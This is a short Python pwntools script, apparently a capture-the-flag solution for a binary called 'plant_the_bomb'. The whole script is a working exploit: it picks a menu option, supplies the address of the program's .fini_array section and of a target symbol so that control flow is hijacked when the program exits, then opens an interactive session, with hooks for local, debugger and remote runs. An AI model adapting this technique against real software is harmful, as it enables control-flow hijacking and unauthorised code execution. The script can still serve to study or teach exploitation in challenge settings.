#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./plant_the_bomb', checksec=False)
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl', '-e', 'sh', '-c']

gdbscript = '''
    b *mission+79
    b *mission+144
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote('', 0)
    else:
        return process(elf.path)

p = start()

p.sendlineafter(b'>> ', b'2')

p.sendlineafter(b': ', hex(elf.get_section_by_name('.fini_array').header.sh_addr))
p.sendlineafter(b': ', hex(elf.sym._))

p.interactive()
